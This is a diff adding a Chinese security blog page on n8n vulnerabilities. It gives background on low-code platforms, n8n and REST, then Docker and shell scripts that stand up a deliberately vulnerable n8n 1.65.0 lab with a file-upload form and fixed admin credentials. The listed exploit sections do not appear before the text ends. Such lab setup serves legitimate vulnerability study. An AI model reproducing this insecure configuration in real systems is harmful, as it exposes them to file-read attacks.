@@ -1,0 +1,776 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>n8n与它的多个漏洞 | 雲流のLowest World</title>
+  <meta name="author" content="C1oudfL0w0" />
+  <meta name="description" content="" />
+  <meta name="keywords" content="" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+  <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+  <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+  <!--flag{never_g0nna g1ve_you up}-->
+
+  <!-- 页面点击特效 -->
+  <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+  <!-- 浏览器标题 -->
+  <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+  <!-- 动态背景 -->
+  
+
+  <!--文章目录-->
+  
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">基础概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E4%BB%A3%E7%A0%81-Low-Code"><span class="toc-number">2.1.</span> <span class="toc-text">低代码 Low-Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#n8n"><span class="toc-number">2.2.</span> <span class="toc-text">n8n</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REST-API"><span class="toc-number">2.3.</span> <span class="toc-text">REST API</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2026-21858-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">CVE-2026-21858 未授权任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">原理简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">4.2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8%EF%BC%8C%E7%99%BB%E5%BD%95-admin"><span class="toc-number">4.3.</span> <span class="toc-text">进一步利用，登录 admin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-68613-RCE"><span class="toc-number">5.</span> <span class="toc-text">CVE-2025-68613 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-68668-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">CVE-2025-68668 Pyodide 沙箱逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2026-21877-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-RCE"><span class="toc-number">7.</span> <span class="toc-text">CVE-2026-21877 任意文件写入 RCE</span></a></li></ol>
+    </div>
+    <script>
+    (function () {
+        function initTocHighlight() {
+            var tocLinks = document.querySelectorAll('#toc .toc-link');
+            if (!tocLinks.length) return;
+
+            // 收集所有标题锚点对应的 DOM 元素
+            var headings = [];
+            tocLinks.forEach(function (link) {
+                var href = link.getAttribute('href');
+                if (!href) return;
+                var id = decodeURIComponent(href.slice(1));
+                var el = document.getElementById(id);
+                if (el) headings.push({ el: el, link: link });
+            });
+            if (!headings.length) return;
+
+            var activeLink = null;
+            var offset = 80;
+
+            function highlight() {
+                var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+                var current = null;
+
+                for (var i = 0; i < headings.length; i++) {
+                    if (headings[i].el.getBoundingClientRect().top <= offset + 10) {
+                        current = headings[i];
+                    }
+                }
+
+                // 仅在用户确实滚动过、且到达页面底部时，才强制高亮最后一个
+                if (scrollTop > 100 && window.innerHeight + scrollTop >= document.documentElement.scrollHeight - 50) {
+                    current = headings[headings.length - 1];
+                }
+
+                // 页面顶部且没有标题进入视口时，高亮第一个
+                if (scrollTop == 0) {
+                    current = headings[0];
+                }
+
+                if (current && current.link !== activeLink) {
+                    // 清除所有高亮
+                    tocLinks.forEach(function (link) {
+                        link.classList.remove('toc-active');
+                    });
+
+                    // 高亮当前项
+                    current.link.classList.add('toc-active');
+                    activeLink = current.link;
+
+                    // TOC 容器自动滚动，使当前项可见
+                    var tocEl = document.getElementById('toc');
+                    var linkRect = activeLink.getBoundingClientRect();
+                    var tocRect = tocEl.getBoundingClientRect();
+                    if (linkRect.top < tocRect.top || linkRect.bottom > tocRect.bottom) {
+                        activeLink.scrollIntoView({ block: 'center', behavior: 'smooth' });
+                    }
+                } else if (!current && activeLink) {
+                    tocLinks.forEach(function (link) {
+                        link.classList.remove('toc-active');
+                    });
+                    activeLink = null;
+                }
+            }
+
+            var ticking = false;
+            window.addEventListener('scroll', function () {
+                if (!ticking) {
+                    requestAnimationFrame(function () {
+                        highlight();
+                        ticking = false;
+                    });
+                    ticking = true;
+                }
+            });
+
+            // 初始高亮
+            highlight();
+        }
+
+        // 等待页面完全加载后再初始化（确保文章标题 DOM 已渲染）
+        if (document.readyState === 'complete') {
+            initTocHighlight();
+        } else {
+            window.addEventListener('load', initTocHighlight);
+        }
+    })();
+    </script>
+  
+
+  <!--返回顶部-->
+  <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+    <a title="返回顶部">↑</a>
+  </div>
+  <script src="/blog/js/totop.js"></script>
+
+  <div id="layout">
+    
+    <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+    
+    <transition name="fade">
+      <div id="loading" v-show="loading">
+        <div id="loading-circle">
+          <h2>LOADING</h2>
+          <p>第一次加载文章图片可能会花费较长时间</p>
+          <p>要不挂个梯子试试？（x</p>
+          <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+          <img src="/blog/images/loading.gif" />
+        </div>
+      </div>
+    </transition>
+    <transition name="into">
+      <div id="main" v-show="!loading">
+        <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+        <div class="article">
+    <div>
+        <h1>n8n与它的多个漏洞</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/4
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CVE/" style="color: #ffa2c4">CVE</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">3.2k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">14分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟跟最新最热</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://n8n.akashio.com/about">https://n8n.akashio.com/about</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud">https://docs.n8n.io/try-it-out/quickstart/#step-one-open-a-workflow-template-and-sign-up-for-n8n-cloud</a></p>
+<p><a target="_blank" rel="noopener" href="https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n">https://datawhalechina.github.io/hello-agents/#/./chapter5/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%9F%BA%E4%BA%8E%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%99%BA%E8%83%BD%E4%BD%93%E6%90%AD%E5%BB%BA?id=_54-%e5%b9%b3%e5%8f%b0%e4%b8%89%ef%bc%9an8n</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Chocapikk/CVE-2026-21858">https://github.com/Chocapikk/CVE-2026-21858</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858">https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858</a></p>
+<p><a target="_blank" rel="noopener" href="https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce">https://0d000721999.github.io/p/cve-2026-21858%E5%A4%8D%E7%8E%B0n8n%E6%9C%AA%E6%8E%88%E6%9D%83rce</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wioui/n8n-CVE-2025-68613-exploit">https://github.com/wioui/n8n-CVE-2025-68613-exploit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md">https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/n8n-Pyodide-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-68668.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n">https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="低代码-Low-Code"><a href="#低代码-Low-Code" class="headerlink" title="低代码 Low-Code"></a>低代码 Low-Code</h2><p>这是一种可视化的软件开发方法</p>
+<p>传统的软件开发需要使用 C#、Java 和 Python 等编程语言进行完全手动编码。由于所有功能都是专业开发人员从零开始构建的，因此一切都可以自定义。但是由于高度专业化会导致技术团队与非技术团队之间的沟通鸿沟较大。</p>
+<p><strong>低代码开发</strong>则是一个可视化流程，如同积木编程，所有技能水平的用户都可以使用入门应用、预构建和可重用的组件以及模板，更快地构建业务应用程序。一些经典的低代码平台如<a target="_blank" rel="noopener" href="https://github.com/jeecgboot/JeecgBoot">积木报表 JeecgBoot</a></p>
+<p>最近比较火的 <a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI">ComfyUI</a>、<a target="_blank" rel="noopener" href="https://github.com/langgenius/dify">Dify</a> 也是低代码平台</p>
+<hr>
+<h2 id="n8n"><a href="#n8n" class="headerlink" title="n8n"></a>n8n</h2><p>一个通用的工作流自动化平台，基本概念由 <strong>节点 (Node)</strong> 和 <strong>工作流 (Workflow)</strong> 组成</p>
+<ul>
+<li>**节点 (Node)**：节点是工作流中执行具体操作的最小单元。你可以把它想象成一个具有特定功能的“积木块”。n8n 提供了数百种预置节点，涵盖了从发送邮件、读写数据库、调用 API 到处理文件等各种常见操作。每个节点都有输入和输出，并提供图形化的配置界面。节点大致可以分为两类：<ul>
+<li>**触发节点 (Trigger Node)**：它是整个工作流的起点，负责启动流程。例如，“当收到一封新的 Gmail 邮件时”、“每小时定时触发一次”或“当接收到一个 Webhook 请求时”。一个工作流必须有且仅有一个触发节点。</li>
+<li>**常规节点 (Regular Node)**：负责处理具体的数据和逻辑。例如，“读取 Google Sheets 表格”、“调用 OpenAI 模型”或“在数据库中插入一条记录”。</li>
+</ul>
+</li>
+<li>**工作流 (Workflow)**：工作流是由多个节点连接而成的自动化流程图。它定义了数据从触发节点开始，如何一步步地在不同节点之间传递、被处理，并最终完成预设任务的完整路径。数据在节点之间以结构化的 JSON 格式进行传递，这使得我们可以精确地控制每一个环节的输入和输出。</li>
+</ul>
+<p>n8n 的真正威力在于其强大的“连接”能力。它可以将原本孤立的应用程序和服务（如企业内部的 CRM、外部的社交媒体平台、你的数据库以及大语言模型）串联起来，实现过去需要复杂编码才能完成的端到端业务流程自动化</p>
+<hr>
+<h2 id="REST-API"><a href="#REST-API" class="headerlink" title="REST API"></a>REST API</h2><p><a target="_blank" rel="noopener" href="https://www.ibm.com/cn-zh/think/topics/rest-apis">https://www.ibm.com/cn-zh/think/topics/rest-apis</a></p>
+<p><strong>Representational State Transfer（表现层状态转移）</strong>，简称 REST</p>
+<p>REST API 是两个计算机系统在 web 浏览器和服务器中使用 HTTP 技术进行通信的一种方式</p>
+<p>相较于 SOAP 或 XML-RPC 这类规定了严格框架的 API，开发者可以使用几乎任何编程语言开发 REST API，并支持各种数据格式，只需要满足以下设计原则：</p>
+<ul>
+<li><strong>统一接口</strong>：无论请求来自何处，对同一资源发出的所有 API 请求都应该看起来相同。（除非设计上就是随机返回）REST API 应确保同一份数据（例如，用户的姓名或电子邮件地址）仅属于一个统一资源标识符 (URI)。资源不应太大，但应包含客户可能需要的每条信息。</li>
+<li><strong>客户端与服务器解耦</strong>：在 REST API 设计中，客户端和服务器应用程序必须完全相互独立。客户端应用程序应该知道的唯一信息是所请求资源的 URI，它不能以任何其他方式与服务器应用程序交互。同样，除了通过 HTTP 将客户端应用程序传递到所请求的数据外，服务器应用程序不应修改客户端应用程序。</li>
+<li><strong>无状态</strong>：REST API 是无状态的，这意味着每个请求都需要包含处理它所需的所有信息。换言之，REST API 不需要任何服务器端会话。不允许服务器应用程序存储与客户端请求相关的任何数据。</li>
+<li><strong>可缓存性</strong>：如果可能，资源应该可以在客户端或服务器端缓存。服务器响应还需要包含有关是否允许对已交付资源进行缓存的信息。目标是提高客户端的性能，同时提高服务器端的可扩展性。</li>
+<li><strong>分层系统架构</strong>：请求的客户端不需要知道它是否在与实际的服务器、代理或任何其他中间人进行通信。</li>
+<li><strong>按需编码（可选）</strong>：REST API 通常发送静态资源，但在某些情况下，响应也可以包含可执行代码（例如 Java 小程序）。在这些情况下，代码只应按需运行。</li>
+</ul>
+<hr>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接使用 <a target="_blank" rel="noopener" href="https://github.com/Chocapikk/CVE-2026-21858">https://github.com/Chocapikk/CVE-2026-21858</a> 的漏洞版本</p>
+<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:20-slim</span>
+
+<span class="token instruction"><span class="token keyword">RUN</span> npm install -g n8n@1.65.0</span>
+
+<span class="token instruction"><span class="token keyword">EXPOSE</span> 5678</span>
+
+<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"n8n"</span>, <span class="token string">"start"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>
+  <span class="token key atrule">n8n</span><span class="token punctuation">:</span>
+    <span class="token key atrule">build</span><span class="token punctuation">:</span> .
+    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> n8n<span class="token punctuation">-</span>vulnerable
+    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token string">"5678:5678"</span>
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> N8N_SECURE_COOKIE=false
+      <span class="token punctuation">-</span> WEBHOOK_URL=http<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>5678/
+    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> ./init<span class="token punctuation">:</span>/init<span class="token punctuation">:</span>ro
+    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span> <span class="token punctuation">></span><span class="token scalar string">
+      bash -c "
+        apt-get update &amp;&amp; apt-get install -y curl > /dev/null 2>&amp;1
+        n8n start &amp;
+        sleep 15
+        bash /init/setup.sh
+        wait
+      "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>setup.sh</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token assign-left variable">BASE_URL</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:5678"</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"[*] Waiting for n8n..."</span>
+<span class="token keyword">until</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/settings"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> versionCli<span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token function">sleep</span> <span class="token number">2</span>
+<span class="token keyword">done</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"[+] n8n is ready"</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"[*] Creating admin..."</span>
+<span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/owner/setup"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"email":"admin@exploit.local","firstName":"Admin","lastName":"Exploit","password":"ExploitLab123!"&#125;'</span>
+
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[*] Logging in..."</span>
+<span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/login"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-c</span> /tmp/cookies.txt <span class="token punctuation">\</span>
+    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"email":"admin@exploit.local","password":"ExploitLab123!"&#125;'</span>
+
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[*] Creating workflow..."</span>
+<span class="token assign-left variable">RESP</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/workflows"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-b</span> /tmp/cookies.txt <span class="token punctuation">\</span>
+    <span class="token parameter variable">-d</span> <span class="token string">'&#123;
+        "name": "Vulnerable Form",
+        "nodes": [
+            &#123;
+                "parameters": &#123;
+                    "formTitle": "Upload",
+                    "responseMode": "responseNode",
+                    "formFields": &#123;"values": [&#123;"fieldLabel": "document", "fieldType": "file", "requiredField": false&#125;]&#125;
+                &#125;,
+                "id": "trigger",
+                "name": "Form Trigger",
+                "type": "n8n-nodes-base.formTrigger",
+                "typeVersion": 2.2,
+                "position": [0, 0],
+                "webhookId": "vulnerable-form"
+            &#125;,
+            &#123;
+                "parameters": &#123;"respondWith": "binary", "inputDataFieldName": "document"&#125;,
+                "id": "respond",
+                "name": "Respond",
+                "type": "n8n-nodes-base.respondToWebhook",
+                "typeVersion": 1.1,
+                "position": [300, 0]
+            &#125;
+        ],
+        "connections": &#123;"Form Trigger": &#123;"main": [[&#123;"node": "Respond", "type": "main", "index": 0&#125;]]&#125;&#125;,
+        "active": false,
+        "settings": &#123;"executionOrder": "v1"&#125;
+    &#125;'</span><span class="token variable">)</span></span>
+
+<span class="token assign-left variable">ID</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESP</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'"id":"[^"]*"'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">'"'</span> <span class="token parameter variable">-f4</span><span class="token variable">)</span></span>
+<span class="token builtin class-name">echo</span> <span class="token string">"[+] Workflow ID: <span class="token variable">$ID</span>"</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"[*] Activating..."</span>
+<span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> PATCH <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/workflows/<span class="token variable">$ID</span>"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+    <span class="token parameter variable">-b</span> /tmp/cookies.txt <span class="token punctuation">\</span>
+    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"active": true&#125;'</span>
+
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"=========================================="</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"[+] Lab ready!"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"[+] Form: http://localhost:5678/form/vulnerable-form"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"[+] Version: 1.65.0 (VULNERABLE)"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"=========================================="</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>账密 admin@exploit.local &#x2F; ExploitLab123!</p>
+<hr>
